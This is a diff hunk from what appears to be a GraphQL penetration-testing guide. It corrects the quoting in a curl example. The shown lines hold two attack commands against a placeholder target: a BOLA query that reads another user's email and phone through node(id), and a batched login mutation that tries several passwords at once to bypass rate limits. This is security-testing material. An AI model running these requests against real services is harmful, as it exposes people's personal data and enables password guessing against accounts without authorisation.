@@ -488,7 +488,7 @@ Every GraphQL finding has a "now do Y."
 # BOLA via node(id) — A's token, B's object:
 curl -s https://target.com/graphql -H "Authorization: Bearer <A_TOKEN>" \
   -H 'Content-Type: application/json' \
-  -d '{"query":"{ node(i"VXNlcjoxMjQ=\"){ ... on User { id email phone } } }"}'
+  -d '{"query":"{ node(id:\"VXNlcjoxMjQ=\"){ ... on User { id email phone } } }"}'
 # Batching rate-limit bypass (one request, many logins):
 curl -s https://target.com/graphql -H 'Content-Type: application/json' \
   -d '{"query":"mutation{a:login(u:\"v\",p:\"1\"){t} b:login(u:\"v\",p:\"2\"){t} c:login(u:\"v\",p:\"3\"){t}}"}'
